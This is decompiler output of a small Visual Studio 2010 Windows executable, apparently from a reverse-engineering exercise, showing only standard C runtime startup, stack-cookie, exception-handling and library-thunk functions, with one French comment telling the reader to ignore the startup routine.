ushort __thiscall std::basic_streambuf<>::uflow(basic_streambuf<> *this)

{
  ushort uVar1;

  // WARNING: Could not recover jumptable at 0x004032f6. Too many branches
  // WARNING: Treating indirect jump as call
  uVar1 = uflow(this);
  return uVar1;
}

__int64 __thiscall std::basic_streambuf<>::showmanyc(basic_streambuf<> *this)

{
  __int64 _Var1;

  // WARNING: Could not recover jumptable at 0x004032fc. Too many branches
  // WARNING: Treating indirect jump as call
  _Var1 = showmanyc(this);
  return _Var1;
}

void __thiscall std::basic_streambuf<>::_Unlock(basic_streambuf<> *this)

{
  // WARNING: Could not recover jumptable at 0x00403302. Too many branches
  // WARNING: Treating indirect jump as call
  _Unlock(this);
  return;
}

void __thiscall std::basic_streambuf<>::_Lock(basic_streambuf<> *this)

{
  // WARNING: Could not recover jumptable at 0x00403308. Too many branches
  // WARNING: Treating indirect jump as call
  _Lock(this);
  return;
}

// Library Function - Single Match
//  @__security_check_cookie@4
//
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_00406018)
  {
    return;
  }
  // WARNING: Subroutine does not return
  ___report_gsfailure();
}

void __cdecl operator_delete(void *param_1)

{
  // WARNING: Could not recover jumptable at 0x0040331e. Too many branches
  // WARNING: Treating indirect jump as call
  operator_delete(param_1);
  return;
}

// Library Function - Multiple Matches With Different Base Names
//  public: virtual void * __thiscall CDaoRelationFieldInfo::`vector deleting destructor'(unsigned
// int)
//  public: virtual void * __thiscall exception::`vector deleting destructor'(unsigned int)
//  public: virtual void * __thiscall std::exception::`vector deleting destructor'(unsigned int)
//  public: virtual void * __thiscall logic_error::`vector deleting destructor'(unsigned int)
//   5 names - too many to list
//
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int *__thiscall FID_conflict__vector_deleting_destructor_(void *this, byte param_1)

{
  int *piVar1;

  if ((param_1 & 2) == 0)
  {
    type_info::_type_info_dtor_internal_method((type_info *)this);
    piVar1 = (int *)this;
    if ((param_1 & 1) != 0)
    {
      operator_delete(this);
    }
  }
  else
  {
    piVar1 = (int *)((int)this + -4);
    _eh_vector_destructor_iterator_(this, 0xc, *piVar1, type_info::_type_info_dtor_internal_method);
    if ((param_1 & 1) != 0)
    {
      operator_delete(piVar1);
    }
  }
  return piVar1;
}

void *__cdecl operator_new(uint param_1)

{
  void *pvVar1;

  // WARNING: Could not recover jumptable at 0x00403376. Too many branches
  // WARNING: Treating indirect jump as call
  pvVar1 = operator_new(param_1);
  return pvVar1;
}

char *__thiscall std::exception::what(exception *this)

{
  char *pcVar1;

  // WARNING: Could not recover jumptable at 0x0040337c. Too many branches
  // WARNING: Treating indirect jump as call
  pcVar1 = what(this);
  return pcVar1;
}

// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___tmainCRTStartup
//
// Library: Visual Studio 2010 Release

/*
Ne pas tenir compte de cette fonction, c'est C qui l'exécute avant de lancer le main

*/
int ___tmainCRTStartup(void)

{
  bool bVar1;
  void *Exchange;
  void *pvVar2;
  int iVar3;
  BOOL BVar4;

  if (DAT_004065f4 == 0)
  {
    HeapSetInformation((HANDLE)0x0, HeapEnableTerminationOnCorruption, (PVOID)0x0, 0);
  }
  Exchange = StackBase;
  bVar1 = false;
  do
  {
    pvVar2 = (void *)InterlockedCompareExchange((LONG *)&DAT_004065e8, (LONG)Exchange, 0);
    if (pvVar2 == (void *)0x0)
    {
    LAB_0040342b:
      if (DAT_004065e4 == 1)
      {
        _amsg_exit(0x1f);
      }
      else if (DAT_004065e4 == 0)
      {
        DAT_004065e4 = 1;
        iVar3 = _initterm_e(&DAT_0040420c, &DAT_0040421c);
        if (iVar3 != 0)
        {
          return 0xff;
        }
      }
      else
      {
        DAT_0040629c = 1;
      }
      if (DAT_004065e4 == 1)
      {
        _initterm(&DAT_00404200, &DAT_00404208);
        DAT_004065e4 = 2;
      }
      if (!bVar1)
      {
        InterlockedExchange((LONG *)&DAT_004065e8, 0);
      }
      if ((DAT_004065f8 != (code *)0x0) &&
          (BVar4 = __IsNonwritableInCurrentImage((PBYTE)&DAT_004065f8), BVar4 != 0))
      {
        (*DAT_004065f8)(0, 2, 0);
      }
      *(unsigned int *)__initenv_exref = DAT_00406284;
      DAT_00406298 = main(DAT_00406280);
      if (DAT_0040628c != 0)
      {
        if (DAT_0040629c == 0)
        {
          _cexit();
        }
        return DAT_00406298;
      }
      // WARNING: Subroutine does not return
      exit(DAT_00406298);
    }
    if (pvVar2 == Exchange)
    {
      bVar1 = true;
      goto LAB_0040342b;
    }
    Sleep(1000);
  } while (true);
}

void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
//
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  unsigned int in_EAX;
  HANDLE hProcess;
  unsigned int in_ECX;
  unsigned int in_EDX;
  unsigned int unaff_EBX;
  unsigned int unaff_EBP;
  unsigned int unaff_ESI;
  unsigned int unaff_EDI;
  unsigned short in_ES;
  unsigned short in_CS;
  unsigned short in_SS;
  unsigned short in_DS;
  unsigned short in_FS;
  unsigned short in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  unsigned int unaff_retaddr;
  UINT uExitCode;
  unsigned int local_32c;
  unsigned int local_328;

  _DAT_004063b8 =
      (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc, 0x328) * 0x800 |
      (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
      (uint)(&stack0x00000000 == (unsigned char *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
      (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
      (uint)(&stack0xfffffffc < (unsigned char *)0x328) | (uint)(in_ID & 1) * 0x200000 |
      (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_004063bc = &stack0x00000004;
  _DAT_004062f8 = 0x10001;
  _DAT_004062a0 = 0xc0000409;
  _DAT_004062a4 = 1;
  local_32c = DAT_00406018;
  local_328 = DAT_0040601c;
  _DAT_004062ac = unaff_retaddr;
  _DAT_00406384 = in_GS;
  _DAT_00406388 = in_FS;
  _DAT_0040638c = in_ES;
  _DAT_00406390 = in_DS;
  _DAT_00406394 = unaff_EDI;
  _DAT_00406398 = unaff_ESI;
  _DAT_0040639c = unaff_EBX;
  _DAT_004063a0 = in_EDX;
  _DAT_004063a4 = in_ECX;
  _DAT_004063a8 = in_EAX;
  _DAT_004063ac = unaff_EBP;
  DAT_004063b0 = unaff_retaddr;
  _DAT_004063b4 = in_CS;
  _DAT_004063c0 = in_SS;
  DAT_004062f0 = IsDebuggerPresent();
  _crt_debugger_hook(1);
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_00404244);
  if (DAT_004062f0 == 0)
  {
    _crt_debugger_hook(1);
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess, uExitCode);
  return;
}

// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void __stdcall __ArrayUnwind(void *,unsigned int,int,void (__thiscall*)(void *))
//
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __ArrayUnwind(void *param_1, uint param_2, int param_3, _func_void_void_ptr *param_4)

{
  void *in_stack_ffffffc8;

  while (true)
  {
    param_3 = param_3 + -1;
    if (param_3 < 0)
      break;
    (*param_4)(in_stack_ffffffc8);
  }
  return;
}

// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void __stdcall `eh vector destructor iterator'(void *,unsigned int,int,void (__thiscall*)(void
// *))
//
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void _eh_vector_destructor_iterator_(void *param_1, uint param_2, int param_3, _func_void_void_ptr *param_4)

{
  void *in_stack_ffffffd0;

  while (true)
  {
    param_3 = param_3 + -1;
    if (param_3 < 0)
      break;
    (*param_4)(in_stack_ffffffd0);
  }
  FUN_004037c9();
  return;
}

void FUN_004037c9(void)

{
  int unaff_EBP;

  if (*(int *)(unaff_EBP + -0x1c) == 0)
  {
    __ArrayUnwind(*(void **)(unaff_EBP + 8), *(uint *)(unaff_EBP + 0xc), *(int *)(unaff_EBP + 0x10),
                  *(_func_void_void_ptr **)(unaff_EBP + 0x14));
  }
  return;
}

// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
//
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;

  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
      ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
                                                     (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000))))))
  {
    terminate();
  }
  return 0;
}

void __cdecl _amsg_exit(int param_1)

{
  // WARNING: Could not recover jumptable at 0x00403832. Too many branches
  // WARNING: Treating indirect jump as call
  _amsg_exit(param_1);
  return;
}

// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
//
// Library: Visual Studio 2010 Release

_onexit_t __cdecl __onexit(_onexit_t param_1)

{
  _onexit_t p_Var1;
  PVOID pvVar2;
  PVOID *ppvVar3;
  PVOID *ppvVar4;
  PVOID local_24;
  PVOID local_20[5];
  unsigned int uStack_c;
  unsigned char *local_8;

  local_8 = &DAT_004048f0;
  uStack_c = 0x403844;
  local_20[0] = DecodePointer(DAT_004065f0);
  if (local_20[0] == (PVOID)0xffffffff)
  {
    p_Var1 = _onexit(param_1);
  }
  else
  {
    _lock(8);
    local_8 = (unsigned char *)0x0;
    local_20[0] = DecodePointer(DAT_004065f0);
    local_24 = DecodePointer(DAT_004065ec);
    ppvVar4 = &local_24;
    ppvVar3 = local_20;
    pvVar2 = EncodePointer(param_1);
    p_Var1 = (_onexit_t)__dllonexit(pvVar2, ppvVar3, ppvVar4);
    DAT_004065f0 = EncodePointer(local_20[0]);
    DAT_004065ec = EncodePointer(local_24);
    local_8 = (unsigned char *)0xfffffffe;
    FUN_004038d0();
  }
  return p_Var1;
}

void FUN_004038d0(void)

{
  _unlock(8);
  return;
}

// Library Function - Single Match
//  _atexit
//
// Library: Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;

  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}

// WARNING: Removing unreachable block (ram,0x00403904)
// WARNING: Removing unreachable block (ram,0x0040390a)
// WARNING: Removing unreachable block (ram,0x0040390c)

void FUN_004038f0(void)

{
  return;
}

void FUN_0040393c(void)

{
  // WARNING: Treating indirect jump as call
  (*(code *)0x5938)();
  return;
}

// Library Function - Single Match
//  __ValidateImageBase
//
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
      (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550))
  {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}

// Library Function - Single Match
//  __FindPESection
//
// Library: Visual Studio 2010 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase, DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;

  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)(pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0)
  {
    do
    {
      if ((p_Var2->VirtualAddress <= rva) &&
          (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress))
      {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}

// Library Function - Single Match
//  __IsNonwritableInCurrentImage
//
// Library: Visual Studio 2010 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  unsigned int local_8;

  pcStack_10 = FUN_00403b09;
  local_14 = ExceptionList;
  local_c = DAT_00406018 ^ 0x404910;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0)
  {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000, (DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0)
    {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}

void _initterm(void)

{
  // WARNING: Could not recover jumptable at 0x00403a9c. Too many branches
  // WARNING: Treating indirect jump as call
  _initterm();
  return;
}

void _initterm_e(void)

{
  // WARNING: Could not recover jumptable at 0x00403aa2. Too many branches
  // WARNING: Treating indirect jump as call
  _initterm_e();
  return;
}

// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
//
// Library: Visual Studio

void __cdecl __SEH_prolog4(unsigned int param_1, int param_2)

{
  int iVar1;
  unsigned int unaff_EBX;
  unsigned int unaff_ESI;
  unsigned int unaff_EDI;
  unsigned int unaff_retaddr;
  uint auStack_1c[5];
  unsigned char local_8[8];

  iVar1 = -param_2;
  *(unsigned int *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(unsigned int *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(unsigned int *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00406018 ^ (uint)&param_2;
  *(unsigned int *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}

// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
//
// Library: Visual Studio

void __SEH_epilog4(void)

{
  unsigned int *unaff_EBP;
  unsigned int unaff_retaddr;

  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}

void __cdecl FUN_00403b09(unsigned int param_1, unsigned int param_2, unsigned int param_3, unsigned int param_4)

{
  _except_handler4_common(&DAT_00406018, ___security_check_cookie_4, param_1, param_2, param_3, param_4);
  return;
}

void FUN_00403b2e(void)

{
  errno_t eVar1;

  eVar1 = _controlfp_s((uint *)0x0, 0x10000, 0x30000);
  if (eVar1 != 0)
  {
    // WARNING: Subroutine does not return
    _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);
  }
  return;
}

unsigned int FUN_00403b56(void)

{
  return 0;
}

// Library Function - Single Match
//  ___security_init_cookie
//
// Library: Visual Studio 2010 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;

  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00406018 == 0xbb40e64e) || ((DAT_00406018 & 0xffff0000) == 0))
  {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_00406018 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00406018 == 0xbb40e64e)
    {
      DAT_00406018 = 0xbb40e64f;
    }
    else if ((DAT_00406018 & 0xffff0000) == 0)
    {
      DAT_00406018 = DAT_00406018 | (DAT_00406018 | 0x4711) << 0x10;
    }
    DAT_0040601c = ~DAT_00406018;
  }
  else
  {
    DAT_0040601c = ~DAT_00406018;
  }
  return;
}

void __cdecl _crt_debugger_hook(int param_1)

{
  // WARNING: Could not recover jumptable at 0x00403bf4. Too many branches
  // WARNING: Treating indirect jump as call
  _crt_debugger_hook(param_1);
  return;
}

void __cdecl terminate(void)

{
  // WARNING: Could not recover jumptable at 0x00403bfa. Too many branches
  // WARNING: Treating indirect jump as call
  terminate();
  return;
}

void __thiscall type_info::_type_info_dtor_internal_method(type_info *this)

{
  // WARNING: Could not recover jumptable at 0x00403c00. Too many branches
  // WARNING: Treating indirect jump as call
  _type_info_dtor_internal_method(this);
  return;
}

void __cdecl _unlock(int _File)

{
  // WARNING: Could not recover jumptable at 0x00403c06. Too many branches
  // WARNING: Treating indirect jump as call
  _unlock(_File);
  return;
}

void __dllonexit(void)

{
  // WARNING: Could not recover jumptable at 0x00403c0c. Too many branches
  // WARNING: Treating indirect jump as call
  __dllonexit();
  return;
}

void __cdecl _lock(int _File)

{
  // WARNING: Could not recover jumptable at 0x00403c12. Too many branches
  // WARNING: Treating indirect jump as call
  _lock(_File);
  return;
}

void _except_handler4_common(void)

{
  // WARNING: Could not recover jumptable at 0x00403c18. Too many branches
  // WARNING: Treating indirect jump as call
  _except_handler4_common();
  return;
}

void __cdecl _invoke_watson(wchar_t *param_1, wchar_t *param_2, wchar_t *param_3, uint param_4, uintptr_t param_5)

{
  // WARNING: Could not recover jumptable at 0x00403c1e. Too many branches
  // WARNING: Subroutine does not return
  // WARNING: Treating indirect jump as call
  _invoke_watson(param_1, param_2, param_3, param_4, param_5);
  return;
}

errno_t __cdecl _controlfp_s(uint *_CurrentState, uint _NewValue, uint _Mask)

{
  errno_t eVar1;

  // WARNING: Could not recover jumptable at 0x00403c24. Too many branches
  // WARNING: Treating indirect jump as call
  eVar1 = _controlfp_s(_CurrentState, _NewValue, _Mask);
  return eVar1;
}

void *__cdecl memcpy(void *_Dst, void *_Src, size_t _Size)

{
  void *pvVar1;

  // WARNING: Could not recover jumptable at 0x00403c2a. Too many branches
  // WARNING: Treating indirect jump as call
  pvVar1 = memcpy(_Dst, _Src, _Size);
  return pvVar1;
}

void _CxxThrowException(void *pExceptionObject, ThrowInfo *pThrowInfo)

{
  // WARNING: Could not recover jumptable at 0x00403c36. Too many branches
  // WARNING: Subroutine does not return
  // WARNING: Treating indirect jump as call
  _CxxThrowException(pExceptionObject, pThrowInfo);
  return;
}

void *__cdecl memset(void *_Dst, int _Val, size_t _Size)

{
  void *pvVar1;

  // WARNING: Could not recover jumptable at 0x00403c40. Too many branches
  // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst, _Val, _Size);
  return pvVar1;
}

ulonglong __fastcall FUN_00403c50(unsigned int param_1, unsigned int param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;

  if (DAT_004065e0 == 0)
  {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0))
    {
      if ((int)fVar3 < 0)
      {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else
      {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2), local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2, (int)in_ST0);
}

void Unwind_00403d10(void)

{
  FUN_00402ed0();
  return;
}

void Unwind_00403d40(void)

{
  FUN_00402ed0();
  return;
}

void Unwind_00403d48(void)

{
  int unaff_EBP;

  FUN_00402c80((int **)(unaff_EBP + -0x1c));
  return;
}

void Unwind_00403d52(void)

{
  FUN_00402ed0();
  return;
}

void Unwind_00403d80(void)

{
  int unaff_EBP;

  // WARNING: Could not recover jumptable at 0x00403d86. Too many branches
  // WARNING: Treating indirect jump as call
  std::basic_iostream<>::~basic_iostream<>((basic_iostream<> *)(*(int *)(unaff_EBP + -0x10) + -0x48));
  return;
}

void Unwind_00403dd0(void)

{
  int unaff_EBP;

  // WARNING: Could not recover jumptable at 0x00403dd6. Too many branches
  // WARNING: Treating indirect jump as call
  std::basic_iostream<>::~basic_iostream<>((basic_iostream<> *)(*(int *)(unaff_EBP + -0x10) + -0x48));
  return;
}

void Unwind_00403e00(void)

{
  FUN_00402230();
  return;
}

void Unwind_00403e08(void)

{
  FUN_00402230();
  return;
}

void Unwind_00403e10(void)

{
  FUN_00402230();
  return;
}

void Unwind_00403e40(void)

{
  int unaff_EBP;

  if ((*(uint *)(unaff_EBP + -0x11c) & 1) != 0)
  {
    *(uint *)(unaff_EBP + -0x11c) = *(uint *)(unaff_EBP + -0x11c) & 0xfffffffe;
    // WARNING: Could not recover jumptable at 0x00403e59. Too many branches
    // WARNING: Treating indirect jump as call
    std::basic_ios<>::~basic_ios<>((basic_ios<> *)(unaff_EBP + -0x78));
    return;
  }
  return;
}

void Unwind_00403e60(void)

{
  int unaff_EBP;

  // WARNING: Could not recover jumptable at 0x00403e66. Too many branches
  // WARNING: Treating indirect jump as call
  std::basic_iostream<>::~basic_iostream<>((basic_iostream<> *)(unaff_EBP + -0xc0));
  return;
}

void Unwind_00403e6c(void)

{
  int unaff_EBP;

  // WARNING: Could not recover jumptable at 0x00403e72. Too many branches
  // WARNING: Treating indirect jump as call
  std::basic_streambuf<>::~basic_streambuf<>(*(basic_streambuf<> **)(unaff_EBP + -0x124));
  return;
}

void Unwind_00403e78(void)

{
  int unaff_EBP;

  FUN_00401790((int *)(unaff_EBP + -0xd8));
  return;
}

void Unwind_00403e83(void)

{
  int unaff_EBP;

  // WARNING: Could not recover jumptable at 0x00403e8c. Too many branches
  // WARNING: Treating indirect jump as call
  std::basic_iostream<>::~basic_iostream<>((basic_iostream<> *)(*(int *)(unaff_EBP + -0xdc) + -0x48));
  return;
}

void Unwind_00403e92(void)

{
  int unaff_EBP;

  // WARNING: Could not recover jumptable at 0x00403e98. Too many branches
  // WARNING: Treating indirect jump as call
  std::basic_streambuf<>::~basic_streambuf<>(*(basic_streambuf<> **)(unaff_EBP + -0xe0));
  return;
}
